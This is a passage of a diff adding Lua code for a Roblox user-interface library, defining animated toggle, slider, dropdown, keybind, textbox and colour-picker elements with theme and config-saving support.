+				AnchorPoint = Vector2.new(0.5, 0.5)
+			}), {
+				SetProps(MakeElement("Stroke"), {
+					Color = ToggleConfig.Color,
+					Name = "Stroke",
+					Transparency = 0.5
+				}),
+				SetProps(MakeElement("Image", "rbxassetid://3944680095"), {
+					Size = UDim2.new(0, 20, 0, 20),
+					AnchorPoint = Vector2.new(0.5, 0.5),
+					Position = UDim2.new(0.5, 0, 0.5, 0),
+					ImageColor3 = Color3.fromRGB(255, 255, 255),
+					Name = "Ico"
+				}),
+			})
+
+			local ToggleFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 38),
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", ToggleConfig.Name, 15), {
+					Size = UDim2.new(1, -12, 1, 0),
+					Position = UDim2.new(0, 12, 0, 0),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content"
+				}), "Text"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				ToggleBox,
+				Click
+			}), "Second")
+
+			function Toggle:Set(Value)
+				Toggle.Value = Value
+				TweenService:Create(ToggleBox, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Toggle.Value and ToggleConfig.Color or Library.Themes.Default.Divider}):Play()
+				TweenService:Create(ToggleBox.Stroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = Toggle.Value and ToggleConfig.Color or Library.Themes.Default.Stroke}):Play()
+				TweenService:Create(ToggleBox.Ico, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = Toggle.Value and 0 or 1, Size = Toggle.Value and UDim2.new(0, 20, 0, 20) or UDim2.new(0, 8, 0, 8)}):Play()
+				ToggleConfig.Callback(Toggle.Value)
+			end    
+
+			Toggle:Set(Toggle.Value)
+
+			AddConnection(Click.MouseEnter, function()
+				TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+			end)
+
+			AddConnection(Click.MouseLeave, function()
+				TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Library.Themes[Library.SelectedTheme].Second}):Play()
+			end)
+
+			AddConnection(Click.MouseButton1Up, function()
+				TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+				SaveCfg(game.GameId)
+				Toggle:Set(not Toggle.Value)
+			end)
+
+			AddConnection(Click.MouseButton1Down, function()
+				TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 6, Library.Themes[Library.SelectedTheme].Second.G * 255 + 6, Library.Themes[Library.SelectedTheme].Second.B * 255 + 6)}):Play()
+			end)
+
+			if ToggleConfig.Flag then
+				Library.Flags[ToggleConfig.Flag] = Toggle
+			end	
+			return Toggle
+		end  
+		function ElementFunction:AddSlider(SliderConfig)
+			SliderConfig = SliderConfig or {}
+			SliderConfig.Name = SliderConfig.Name or "Slider"
+			SliderConfig.Min = SliderConfig.Min or 0
+			SliderConfig.Max = SliderConfig.Max or 100
+			SliderConfig.Increment = SliderConfig.Increment or 1
+			SliderConfig.Default = SliderConfig.Default or 50
+			SliderConfig.Callback = SliderConfig.Callback or function() end
+			SliderConfig.ValueName = SliderConfig.ValueName or ""
+			SliderConfig.Color = SliderConfig.Color or Color3.fromRGB(238, 220, 149)
+			SliderConfig.Flag = SliderConfig.Flag or nil
+			SliderConfig.Save = SliderConfig.Save or false
+
+			local Slider = {Value = SliderConfig.Default, Save = SliderConfig.Save}
+			local Dragging = false
+
+			local SliderDrag = SetChildren(SetProps(MakeElement("RoundFrame", SliderConfig.Color, 0, 5), {
+				Size = UDim2.new(0, 0, 1, 0),
+				BackgroundTransparency = 0.3,
+				ClipsDescendants = true
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", "value", 13), {
+					Size = UDim2.new(1, -12, 0, 14),
+					Position = UDim2.new(0, 12, 0, 6),
+					Font = Enum.Font.FredokaOne,
+					Name = "Value",
+					TextTransparency = 0
+				}), "Text")
+			})
+
+			local SliderBar = SetChildren(SetProps(MakeElement("RoundFrame", SliderConfig.Color, 0, 5), {
+				Size = UDim2.new(1, -24, 0, 26),
+				Position = UDim2.new(0, 12, 0, 30),
+				BackgroundTransparency = 0.9
+			}), {
+				SetProps(MakeElement("Stroke"), {
+					Color = SliderConfig.Color
+				}),
+				AddThemeObject(SetProps(MakeElement("Label", "value", 13), {
+					Size = UDim2.new(1, -12, 0, 14),
+					Position = UDim2.new(0, 12, 0, 6),
+					Font = Enum.Font.FredokaOne,
+					Name = "Value",
+					TextTransparency = 0.8
+				}), "Text"),
+				SliderDrag
+			})
+
+			local SliderFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
+				Size = UDim2.new(1, 0, 0, 65),
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", SliderConfig.Name, 15), {
+					Size = UDim2.new(1, -12, 0, 14),
+					Position = UDim2.new(0, 12, 0, 10),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content"
+				}), "Text"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				SliderBar
+			}), "Second")
+
+			SliderBar.InputBegan:Connect(function(Input)
+				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then 
+					Dragging = true 
+				end 
+			end)
+			SliderBar.InputEnded:Connect(function(Input) 
+				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then 
+					Dragging = false 
+				end 
+			end)
+
+			UserInputService.InputChanged:Connect(function(Input)
+				if Dragging then 
+					local SizeScale = math.clamp((Mouse.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
+					Slider:Set(SliderConfig.Min + ((SliderConfig.Max - SliderConfig.Min) * SizeScale)) 
+					SaveCfg(game.GameId)
+				end
+			end)
+
+			function Slider:Set(Value)
+				self.Value = math.clamp(Round(Value, SliderConfig.Increment), SliderConfig.Min, SliderConfig.Max)
+				TweenService:Create(SliderDrag,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = UDim2.fromScale((self.Value - SliderConfig.Min) / (SliderConfig.Max - SliderConfig.Min), 1)}):Play()
+				SliderBar.Value.Text = tostring(self.Value) .. " " .. SliderConfig.ValueName
+				SliderDrag.Value.Text = tostring(self.Value) .. " " .. SliderConfig.ValueName
+				SliderConfig.Callback(self.Value)
+			end      
+
+			Slider:Set(Slider.Value)
+			if SliderConfig.Flag then				
+				Library.Flags[SliderConfig.Flag] = Slider
+			end
+			return Slider
+		end  
+		function ElementFunction:AddDropdown(DropdownConfig)
+			DropdownConfig = DropdownConfig or {}
+			DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
+			DropdownConfig.Options = DropdownConfig.Options or {}
+			DropdownConfig.Default = DropdownConfig.Default or ""
+			DropdownConfig.Callback = DropdownConfig.Callback or function() end
+			DropdownConfig.Flag = DropdownConfig.Flag or nil
+			DropdownConfig.Save = DropdownConfig.Save or false
+
+			local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save}
+			local MaxElements = 5
+
+			if not table.find(Dropdown.Options, Dropdown.Value) then
+				Dropdown.Value = "..."
+			end
+
+			local DropdownList = MakeElement("List")
+
+			local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
+				DropdownList
+			}), {
+				Parent = ItemParent,
+				Position = UDim2.new(0, 0, 0, 38),
+				Size = UDim2.new(1, 0, 1, -38),
+				ClipsDescendants = true
+			}), "Divider")
+
+			local Click = SetProps(MakeElement("Button"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			})
+
+			local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 38),
+				Parent = ItemParent,
+				ClipsDescendants = true
+			}), {
+				DropdownContainer,
+				SetProps(SetChildren(MakeElement("TFrame"), {
+					AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
+						Size = UDim2.new(1, -12, 1, 0),
+						Position = UDim2.new(0, 12, 0, 0),
+						Font = Enum.Font.FredokaOne,
+						Name = "Content"
+					}), "Text"),
+					AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
+						Size = UDim2.new(0, 20, 0, 20),
+						AnchorPoint = Vector2.new(0, 0.5),
+						Position = UDim2.new(1, -30, 0.5, 0),
+						ImageColor3 = Color3.fromRGB(240, 240, 240),
+						Name = "Ico"
+					}), "TextDark"),
+					AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
+						Size = UDim2.new(1, -40, 1, 0),
+						Font = Enum.Font.FredokaOne,
+						Name = "Selected",
+						TextXAlignment = Enum.TextXAlignment.Right
+					}), "TextDark"),
+					AddThemeObject(SetProps(MakeElement("Frame"), {
+						Size = UDim2.new(1, 0, 0, 1),
+						Position = UDim2.new(0, 0, 1, -1),
+						Name = "Line",
+						Visible = false
+					}), "Stroke"), 
+					Click
+				}), {
+					Size = UDim2.new(1, 0, 0, 38),
+					ClipsDescendants = true,
+					Name = "F"
+				}),
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				MakeElement("Corner")
+			}), "Second")
+
+			AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
+				DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
+			end)  
+
+			local function AddOptions(Options)
+				for _, Option in pairs(Options) do
+					local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
+						MakeElement("Corner", 0, 6),
+						AddThemeObject(SetProps(MakeElement("Label", Option, 13, 0.4), {
+							Position = UDim2.new(0, 8, 0, 0),
+							Size = UDim2.new(1, -8, 1, 0),
+							Name = "Title"
+						}), "Text")
+					}), {
+						Parent = DropdownContainer,
+						Size = UDim2.new(1, 0, 0, 28),
+						BackgroundTransparency = 1,
+						ClipsDescendants = true
+					}), "Divider")
+
+					AddConnection(OptionBtn.MouseButton1Click, function()
+						Dropdown:Set(Option)
+						SaveCfg(game.GameId)
+					end)
+
+					Dropdown.Buttons[Option] = OptionBtn
+				end
+			end	
+
+			function Dropdown:Refresh(Options, Delete)
+				if Delete then
+					for _,v in pairs(Dropdown.Buttons) do
+						v:Destroy()
+					end    
+					table.clear(Dropdown.Options)
+					table.clear(Dropdown.Buttons)
+				end
+				Dropdown.Options = Options
+				AddOptions(Dropdown.Options)
+			end  
+
+			function Dropdown:Set(Value)
+				if not table.find(Dropdown.Options, Value) then
+					Dropdown.Value = "..."
+					DropdownFrame.F.Selected.Text = Dropdown.Value
+					for _, v in pairs(Dropdown.Buttons) do
+						TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
+						TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
+					end	
+					return
+				end
+
+				Dropdown.Value = Value
+				DropdownFrame.F.Selected.Text = Dropdown.Value
+
+				for _, v in pairs(Dropdown.Buttons) do
+					TweenService:Create(v,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
+					TweenService:Create(v.Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
+				end	
+				TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
+				TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
+				return DropdownConfig.Callback(Dropdown.Value)
+			end
+
+			AddConnection(Click.MouseButton1Click, function()
+				Dropdown.Toggled = not Dropdown.Toggled
+				DropdownFrame.F.Line.Visible = Dropdown.Toggled
+				TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()
+				if #Dropdown.Options > MaxElements then
+					TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 28)) or UDim2.new(1, 0, 0, 38)}):Play()
+				else
+					TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, DropdownList.AbsoluteContentSize.Y + 38) or UDim2.new(1, 0, 0, 38)}):Play()
+				end
+			end)
+
+			Dropdown:Refresh(Dropdown.Options, false)
+			Dropdown:Set(Dropdown.Value)
+			if DropdownConfig.Flag then				
+				Library.Flags[DropdownConfig.Flag] = Dropdown
+			end
+			return Dropdown
+		end
+		function ElementFunction:AddBind(BindConfig)
+			BindConfig.Name = BindConfig.Name or "Bind"
+			BindConfig.Default = BindConfig.Default or Enum.KeyCode.Unknown
+			BindConfig.Hold = BindConfig.Hold or false
+			BindConfig.Callback = BindConfig.Callback or function() end
+			BindConfig.Flag = BindConfig.Flag or nil
+			BindConfig.Save = BindConfig.Save or false
+
+			local Bind = {Value, Binding = false, Type = "Bind", Save = BindConfig.Save}
+			local Holding = false
+
+			local Click = SetProps(MakeElement("Button"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			})
+
+			local BindBox = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
+				Size = UDim2.new(0, 24, 0, 24),
+				Position = UDim2.new(1, -12, 0.5, 0),
+				AnchorPoint = Vector2.new(1, 0.5)
+			}), {
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				AddThemeObject(SetProps(MakeElement("Label", BindConfig.Name, 14), {
+					Size = UDim2.new(1, 0, 1, 0),
+					Font = Enum.Font.FredokaOne,
+					TextXAlignment = Enum.TextXAlignment.Center,
+					Name = "Value"
+				}), "Text")
+			}), "Main")
+
+			local BindFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 38),
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", BindConfig.Name, 15), {
+					Size = UDim2.new(1, -12, 1, 0),
+					Position = UDim2.new(0, 12, 0, 0),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content"
+				}), "Text"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				BindBox,
+				Click
+			}), "Second")
+
+			AddConnection(BindBox.Value:GetPropertyChangedSignal("Text"), function()
+				TweenService:Create(BindBox, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, BindBox.Value.TextBounds.X + 16, 0, 24)}):Play()
+			end)
+
+			AddConnection(Click.InputEnded, function(Input)
+				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
+					if Bind.Binding then return end
+					Bind.Binding = true
+					BindBox.Value.Text = ""
+				end
+			end)
+
+			AddConnection(UserInputService.InputBegan, function(Input)
+				if UserInputService:GetFocusedTextBox() then return end
+				if (Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value) and not Bind.Binding then
+					if BindConfig.Hold then
+						Holding = true
+						BindConfig.Callback(Holding)
+					else
+						BindConfig.Callback()
+					end
+				elseif Bind.Binding then
+					local Key
+					pcall(function()
+						if not CheckKey(BlacklistedKeys, Input.KeyCode) then
+							Key = Input.KeyCode
+						end
+					end)
+					pcall(function()
+						if CheckKey(WhitelistedMouse, Input.UserInputType) and not Key then
+							Key = Input.UserInputType
+						end
+					end)
+					Key = Key or Bind.Value
+					Bind:Set(Key)
+					SaveCfg(game.GameId)
+				end
+			end)
+
+			AddConnection(UserInputService.InputEnded, function(Input)
+				if Input.KeyCode.Name == Bind.Value or Input.UserInputType.Name == Bind.Value then
+					if BindConfig.Hold and Holding then
+						Holding = false
+						BindConfig.Callback(Holding)
+					end
+				end
+			end)
+
+			AddConnection(Click.MouseEnter, function()
+				TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+			end)
+
+			AddConnection(Click.MouseLeave, function()
+				TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Library.Themes[Library.SelectedTheme].Second}):Play()
+			end)
+
+			AddConnection(Click.MouseButton1Up, function()
+				TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+			end)
+
+			AddConnection(Click.MouseButton1Down, function()
+				TweenService:Create(BindFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 6, Library.Themes[Library.SelectedTheme].Second.G * 255 + 6, Library.Themes[Library.SelectedTheme].Second.B * 255 + 6)}):Play()
+			end)
+
+			function Bind:Set(Key)
+				Bind.Binding = false
+				Bind.Value = Key or Bind.Value
+				Bind.Value = Bind.Value.Name or Bind.Value
+				BindBox.Value.Text = Bind.Value
+			end
+
+			Bind:Set(BindConfig.Default)
+			if BindConfig.Flag then				
+				Library.Flags[BindConfig.Flag] = Bind
+			end
+			return Bind
+		end  
+		function ElementFunction:AddTextbox(TextboxConfig)
+			TextboxConfig = TextboxConfig or {}
+			TextboxConfig.Name = TextboxConfig.Name or "Textbox"
+			TextboxConfig.Default = TextboxConfig.Default or ""
+			TextboxConfig.TextDisappear = TextboxConfig.TextDisappear or false
+			TextboxConfig.Callback = TextboxConfig.Callback or function() end
+
+			local Click = SetProps(MakeElement("Button"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			})
+
+			local TextboxActual = AddThemeObject(Create("TextBox", {
+				Size = UDim2.new(1, 0, 1, 0),
+				BackgroundTransparency = 1,
+				TextColor3 = Color3.fromRGB(255, 255, 255),
+				PlaceholderColor3 = Color3.fromRGB(210,210,210),
+				PlaceholderText = "Input",
+				Font = Enum.Font.GothamSemibold,
+				TextXAlignment = Enum.TextXAlignment.Center,
+				TextSize = 14,
+				ClearTextOnFocus = false
+			}), "Text")
+
+			local TextContainer = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
+				Size = UDim2.new(0, 24, 0, 24),
+				Position = UDim2.new(1, -12, 0.5, 0),
+				AnchorPoint = Vector2.new(1, 0.5)
+			}), {
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				TextboxActual
+			}), "Main")
+
+
+			local TextboxFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 38),
+				Parent = ItemParent
+			}), {
+				AddThemeObject(SetProps(MakeElement("Label", TextboxConfig.Name, 15), {
+					Size = UDim2.new(1, -12, 1, 0),
+					Position = UDim2.new(0, 12, 0, 0),
+					Font = Enum.Font.FredokaOne,
+					Name = "Content"
+				}), "Text"),
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+				TextContainer,
+				Click
+			}), "Second")
+
+			AddConnection(TextboxActual:GetPropertyChangedSignal("Text"), function()
+				TweenService:Create(TextContainer, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, TextboxActual.TextBounds.X + 16, 0, 24)}):Play()
+			end)
+
+			AddConnection(TextboxActual.FocusLost, function()
+				TextboxConfig.Callback(TextboxActual.Text)
+				if TextboxConfig.TextDisappear then
+					TextboxActual.Text = ""
+				end	
+			end)
+
+			TextboxActual.Text = TextboxConfig.Default
+
+			AddConnection(Click.MouseEnter, function()
+				TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+			end)
+
+			AddConnection(Click.MouseLeave, function()
+				TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Library.Themes[Library.SelectedTheme].Second}):Play()
+			end)
+
+			AddConnection(Click.MouseButton1Up, function()
+				TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 3, Library.Themes[Library.SelectedTheme].Second.G * 255 + 3, Library.Themes[Library.SelectedTheme].Second.B * 255 + 3)}):Play()
+				TextboxActual:CaptureFocus()
+			end)
+
+			AddConnection(Click.MouseButton1Down, function()
+				TweenService:Create(TextboxFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(Library.Themes[Library.SelectedTheme].Second.R * 255 + 6, Library.Themes[Library.SelectedTheme].Second.G * 255 + 6, Library.Themes[Library.SelectedTheme].Second.B * 255 + 6)}):Play()
+			end)
+		end 
+		function ElementFunction:AddColorpicker(ColorpickerConfig)
+			ColorpickerConfig = ColorpickerConfig or {}
+			ColorpickerConfig.Name = ColorpickerConfig.Name or "Colorpicker"
+			ColorpickerConfig.Default = ColorpickerConfig.Default or Color3.fromRGB(255,255,255)
+			ColorpickerConfig.Callback = ColorpickerConfig.Callback or function() end
+			ColorpickerConfig.Flag = ColorpickerConfig.Flag or nil
+			ColorpickerConfig.Save = ColorpickerConfig.Save or false
+
+			local ColorH, ColorS, ColorV = 1, 1, 1
+			local Colorpicker = {Value = ColorpickerConfig.Default, Toggled = false, Type = "Colorpicker", Save = ColorpickerConfig.Save}
+
+			local ColorSelection = Create("ImageLabel", {
+				Size = UDim2.new(0, 18, 0, 18),
+				Position = UDim2.new(select(3, Color3.toHSV(Colorpicker.Value))),
+				ScaleType = Enum.ScaleType.Fit,
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				BackgroundTransparency = 1,
+				Image = "http://www.roblox.com/asset/?id=4805639000"
+			})
+
+			local HueSelection = Create("ImageLabel", {
+				Size = UDim2.new(0, 18, 0, 18),
+				Position = UDim2.new(0.5, 0, 1 - select(1, Color3.toHSV(Colorpicker.Value))),
+				ScaleType = Enum.ScaleType.Fit,
+				AnchorPoint = Vector2.new(0.5, 0.5),
+				BackgroundTransparency = 1,
+				Image = "http://www.roblox.com/asset/?id=4805639000"
+			})
+
+			local Color = Create("ImageLabel", {
+				Size = UDim2.new(1, -25, 1, 0),
+				Visible = false,
+				Image = "rbxassetid://4155801252"
+			}, {
+				Create("UICorner", {CornerRadius = UDim.new(0, 5)}),
+				ColorSelection
+			})
+
+			local Hue = Create("Frame", {
+				Size = UDim2.new(0, 20, 1, 0),
+				Position = UDim2.new(1, -20, 0, 0),
+				Visible = false
+			}, {
+				Create("UIGradient", {Rotation = 270, Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(0.20, Color3.fromRGB(234, 255, 0)), ColorSequenceKeypoint.new(0.40, Color3.fromRGB(21, 255, 0)), ColorSequenceKeypoint.new(0.60, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.80, Color3.fromRGB(0, 17, 255)), ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 0, 251)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 4))},}),
+				Create("UICorner", {CornerRadius = UDim.new(0, 5)}),
+				HueSelection
+			})
+
+			local ColorpickerContainer = Create("Frame", {
+				Position = UDim2.new(0, 0, 0, 32),
+				Size = UDim2.new(1, 0, 1, -32),
+				BackgroundTransparency = 1,
+				ClipsDescendants = true
+			}, {
+				Hue,
+				Color,
+				Create("UIPadding", {
+					PaddingLeft = UDim.new(0, 35),
+					PaddingRight = UDim.new(0, 35),
+					PaddingBottom = UDim.new(0, 10),
+					PaddingTop = UDim.new(0, 17)
+				})
+			})
+
+			local Click = SetProps(MakeElement("Button"), {
+				Size = UDim2.new(1, 0, 1, 0)
+			})
+
+			local ColorpickerBox = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
+				Size = UDim2.new(0, 24, 0, 24),
+				Position = UDim2.new(1, -12, 0.5, 0),
+				AnchorPoint = Vector2.new(1, 0.5)
+			}), {
+				AddThemeObject(MakeElement("Stroke"), "Stroke")
+			}), "Main")
+
+			local ColorpickerFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
+				Size = UDim2.new(1, 0, 0, 38),
+				Parent = ItemParent
+			}), {
+				SetProps(SetChildren(MakeElement("TFrame"), {
+					AddThemeObject(SetProps(MakeElement("Label", ColorpickerConfig.Name, 15), {
+						Size = UDim2.new(1, -12, 1, 0),
+						Position = UDim2.new(0, 12, 0, 0),
+						Font = Enum.Font.FredokaOne,
+						Name = "Content"
+					}), "Text"),
+					ColorpickerBox,
+					Click,
+					AddThemeObject(SetProps(MakeElement("Frame"), {
+						Size = UDim2.new(1, 0, 0, 1),
+						Position = UDim2.new(0, 0, 1, -1),
+						Name = "Line",
+						Visible = false
+					}), "Stroke"), 
+				}), {
+					Size = UDim2.new(1, 0, 0, 38),
+					ClipsDescendants = true,
+					Name = "F"
+				}),
+				ColorpickerContainer,
+				AddThemeObject(MakeElement("Stroke"), "Stroke"),
+			}), "Second")
+
+			AddConnection(Click.MouseButton1Click, function()
+				Colorpicker.Toggled = not Colorpicker.Toggled
+				TweenService:Create(ColorpickerFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Colorpicker.Toggled and UDim2.new(1, 0, 0, 148) or UDim2.new(1, 0, 0, 38)}):Play()
+				Color.Visible = Colorpicker.Toggled
+				Hue.Visible = Colorpicker.Toggled
+				ColorpickerFrame.F.Line.Visible = Colorpicker.Toggled
+			end)
+
+			local function UpdateColorPicker()
+				ColorpickerBox.BackgroundColor3 = Color3.fromHSV(ColorH, ColorS, ColorV)
+				Color.BackgroundColor3 = Color3.fromHSV(ColorH, 1, 1)
+				Colorpicker:Set(ColorpickerBox.BackgroundColor3)
+				ColorpickerConfig.Callback(ColorpickerBox.BackgroundColor3)
+				SaveCfg(game.GameId)
+			end
+
+			ColorH = 1 - (math.clamp(HueSelection.AbsolutePosition.Y - Hue.AbsolutePosition.Y, 0, Hue.AbsoluteSize.Y) / Hue.AbsoluteSize.Y)
+			ColorS = (math.clamp(ColorSelection.AbsolutePosition.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
+			ColorV = 1 - (math.clamp(ColorSelection.AbsolutePosition.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
+
+			AddConnection(Color.InputBegan, function(input)
+				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+					if ColorInput then
+						ColorInput:Disconnect()
+					end
+					ColorInput = AddConnection(RunService.RenderStepped, function()
+						local ColorX = (math.clamp(Mouse.X - Color.AbsolutePosition.X, 0, Color.AbsoluteSize.X) / Color.AbsoluteSize.X)
+						local ColorY = (math.clamp(Mouse.Y - Color.AbsolutePosition.Y, 0, Color.AbsoluteSize.Y) / Color.AbsoluteSize.Y)
+						ColorSelection.Position = UDim2.new(ColorX, 0, ColorY, 0)
+						ColorS = ColorX
+						ColorV = 1 - ColorY
+						UpdateColorPicker()
+					end)
+				end
+			end)
+
+			AddConnection(Color.InputEnded, function(input)
